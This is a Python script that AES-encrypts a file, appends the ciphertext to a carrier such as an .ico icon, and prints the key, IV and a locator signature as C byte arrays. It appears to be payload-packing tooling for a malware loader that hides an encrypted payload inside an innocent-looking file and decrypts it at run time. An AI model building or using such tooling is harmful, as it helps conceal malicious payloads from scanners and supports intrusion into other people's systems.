import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

KEYSIZE = 32
IVSIZE = 16

def format_bytes_for_c(name, byte_array):
    hex_items = [f'0x{b:02x}' for b in byte_array]
    lines = [', '.join(hex_items[i:i + 8]) for i in range(0, len(hex_items), 8)]
    return f'unsigned char {name}[{len(byte_array)}] = {{\n    ' + ',\n    '.join(lines) + '\n};'

def embed_into_carrier(carrier_path, encrypted_data, output_path):
    with open(carrier_path, 'rb') as carrier_file:
        carrier_data = carrier_file.read()
    with open(output_path, 'wb') as out_file:
        out_file.write(carrier_data + encrypted_data)
    print(f"[+] Encrypted data appended to carrier: {output_path}")

def encrypt_file(input_path, output_path="data", carrier_path=None, final_output_path=None):
    # Read file
    with open(input_path, 'rb') as f:
        plaintext = f.read()

    # Generate key and IV
    key = get_random_bytes(KEYSIZE)
    iv = get_random_bytes(IVSIZE)

    # Pad plaintext to block size (AES block size is 16)
    padding_len = AES.block_size - len(plaintext) % AES.block_size
    padded_plaintext = plaintext + bytes([padding_len] * padding_len)

    # Encrypt
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(padded_plaintext)
    # Print first 4 bytes of ciphertext as Signature
    sig_bytes = ciphertext[:4]


    # If carrier file is provided, embed the encrypted data into it
    if carrier_path:
        if not final_output_path:
            final_output_path = "output_with_payload"
        embed_into_carrier(carrier_path, ciphertext, final_output_path)
    else:
        # Write ciphertext to output file directly
        with open(output_path, 'wb') as f:
            f.write(ciphertext)
        print(f"[*] Output file: {output_path}")

    # Output key and IV in C format
    print("[+] AES Key:\n")
    print(format_bytes_for_c("Key", key))
    print("[+] AES IV:\n")
    print(format_bytes_for_c("IV", iv))
    sig_c_format = ', '.join(f'0x{b:02x}' for b in sig_bytes)
    print(f"[+] Signature (C format): BYTE signature[SIGNATURE_LEN] = {{ {sig_c_format} }};")

if __name__ == "__main__":
    import sys
    import argparse

    parser = argparse.ArgumentParser(description="Encrypt a file using AES and optionally append to a carrier (e.g., .ico).")
    parser.add_argument("input_file", help="The file to encrypt.")
    parser.add_argument("-c", "--carrier", help="Carrier file to embed encrypted data (e.g., an .ico file).")
    parser.add_argument("-o", "--output", help="Final output file when embedding into carrier.")
    args = parser.parse_args()

    encrypt_file(
        input_path=args.input_file,
        carrier_path=args.carrier,
        final_output_path=args.output
    )
